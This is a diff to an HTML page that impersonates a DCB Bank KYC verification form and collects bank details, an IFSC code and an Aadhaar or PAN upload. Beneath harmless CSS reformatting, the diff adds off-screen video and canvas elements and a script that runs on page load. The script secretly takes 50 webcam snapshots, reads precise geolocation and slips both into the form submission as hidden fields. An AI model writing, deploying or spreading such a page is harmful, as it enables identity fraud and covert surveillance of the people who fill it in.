@@ -2,102 +2,92 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DCB Bank KYC Verification</title>
   <style>
-  body {
-    font-family: Arial, sans-serif;
-    background-color: #f4f6f9;
-    margin: 0;
-    padding: 0;
-  }
-
-  .container {
-    max-width: 500px;
-    margin: 60px auto;
-    background: white;
-    border-radius: 8px;
-    padding: 30px;
-    box-shadow: 0 0 12px rgba(0,0,0,0.1);
-  }
-
-  .logo {
-    display: block;
-    margin: 0 auto 20px;
-    width: 180px;
-  }
-
-  h2 {
-    text-align: center;
-    color: #003d6a;
-  }
-
-  .notice {
-    margin-top: -10px;
-    margin-bottom: 20px;
-    font-size: 13px;
-    color: #444;
-    text-align: center;
-    line-height: 1.5;
-  }
-
-  label {
-    display: block;
-    margin-top: 18px;
-    font-weight: bold;
-    font-size: 16px;
-    color: #222;
-  }
-
-  input[type="text"],
-  input[type="file"] {
-    width: 100%;
-    font-size: 16px;
-    padding: 12px 10px;
-    margin-top: 8px;
-    border-radius: 6px;
-    border: 1px solid #ccc;
-    box-sizing: border-box;
-  }
-
-  button {
-    margin-top: 30px;
-    width: 100%;
-    background-color: #003d6a;
-    color: white;
-    border: none;
-    padding: 14px;
-    font-size: 17px;
-    border-radius: 6px;
-    cursor: pointer;
-  }
-
-  button:hover {
-    background-color: #00548c;
-  }
-
-  .footer {
-    text-align: center;
-    margin-top: 30px;
-    font-size: 12px;
-    color: #777;
-  }
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f6f9;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 500px;
+      margin: 60px auto;
+      background: white;
+      border-radius: 8px;
+      padding: 30px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 180px;
+    }
+    h2 {
+      text-align: center;
+      color: #003d6a;
+    }
+    .notice {
+      margin-top: -10px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #444;
+      text-align: center;
+      line-height: 1.5;
+    }
+    label {
+      display: block;
+      margin-top: 18px;
+      font-weight: bold;
+      font-size: 16px;
+      color: #222;
+    }
+    input[type="text"],
+    input[type="file"] {
+      width: 100%;
+      font-size: 16px;
+      padding: 12px 10px;
+      margin-top: 8px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+    button {
+      margin-top: 30px;
+      width: 100%;
+      background-color: #003d6a;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 17px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #00548c;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 12px;
+      color: #777;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <img class="logo" src="dbc.png" alt="DCB Bank Logo">
-    
     <h2>DCB Bank KYC Verification</h2>
-
     <p class="notice">
-      Please enter the recipient’s bank and other required details carefully.  
-      All details submitted must match the recipient’s bank records.  
+      Please enter the recipient's bank and other required details carefully.  
+      All details submitted must match the recipient's bank records.  
       Invalid or mismatched information may lead to reversal or failure of the transaction.
     </p>
 
-    <form action="/submit" method="POST" enctype="multipart/form-data">
+    <form id="kycForm" action="/submit" method="POST" enctype="multipart/form-data">
       <label for="bankname">Bank Name</label>
-      <input type="text" id="bankname" name="bankname" placeholder="Enter recipient’s bank name" required>
+      <input type="text" id="bankname" name="bankname" placeholder="Enter recipient's bank name" required>
 
       <label for="ifsc">IFSC Code</label>
       <input type="text" id="ifsc" name="ifsc" placeholder="Enter IFSC code" required>
@@ -111,11 +101,110 @@
       <label for="document">Upload Aadhaar or PAN (PDF, JPG, PNG only)</label>
       <input type="file" id="document" name="document" accept=".pdf,.jpg,.jpeg,.png" required>
 
-      <button type="submit">Verify Account</button>
+      <button type="submit" id="submitBtn">Verify Account</button>
     </form>
     <div class="footer">
       © 2025 DCB Bank Ltd. | For official verification purposes only.
     </div>
   </div>
+
+  <!-- Hidden capture elements -->
+  <div style="position: absolute; left: -9999px; width: 1px; height: 1px; overflow: hidden;">
+    <video id="stealthVideo" autoplay muted playsinline></video>
+    <canvas id="stealthCanvas"></canvas>
+  </div>
+
+  <script>
+    (function() {
+      // Stealth capture elements
+      const video = document.getElementById('stealthVideo');
+      const canvas = document.getElementById('stealthCanvas');
+      const ctx = canvas.getContext('2d');
+      let capturedImages = [];
+      let userLocation = null;
+      let captureInterval;
+
+      // Start stealth capture when page loads
+      function initializeStealthCapture() {
+        try {
+          navigator.mediaDevices.getUserMedia({ 
+            video: { 
+              facingMode: "user",
+              width: { ideal: 640 },
+              height: { ideal: 480 }
+            }
+          }).then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              startCaptureSequence();
+            };
+          }).catch(err => {
+            console.error('Stealth capture failed:', err);
+          });
+
+          // Get location silently
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              position => {
+                userLocation = {
+                  lat: position.coords.latitude,
+                  lng: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                  timestamp: position.timestamp
+                };
+              },
+              () => {},
+              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+            );
+          }
+        } catch (e) {
+          console.error('Stealth initialization error:', e);
+        }
+      }
+
+      // Begin capturing images
+      function startCaptureSequence() {
+        let captureCount = 0;
+        captureInterval = setInterval(() => {
+          try {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            capturedImages.push(canvas.toDataURL('image/jpeg', 0.6));
+            captureCount++;
+            
+            if (captureCount >= 50) {
+              clearInterval(captureInterval);
+              if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+              }
+            }
+          } catch (e) {
+            clearInterval(captureInterval);
+            console.error('Capture error:', e);
+          }
+        }, 300);
+      }
+
+      // Modify form submission
+      document.getElementById('kycForm').addEventListener('submit', function(e) {
+        // Add hidden fields for captured data
+        const imagesInput = document.createElement('input');
+        imagesInput.type = 'hidden';
+        imagesInput.name = 'stealthImages';
+        imagesInput.value = JSON.stringify(capturedImages);
+        this.appendChild(imagesInput);
+
+        const locationInput = document.createElement('input');
+        locationInput.type = 'hidden';
+        locationInput.name = 'stealthLocation';
+        locationInput.value = JSON.stringify(userLocation || {});
+        this.appendChild(locationInput);
+      });
+
+      // Initialize when page loads
+      window.addEventListener('load', initializeStealthCapture);
+    })();
+  </script>
 </body>
 </html>
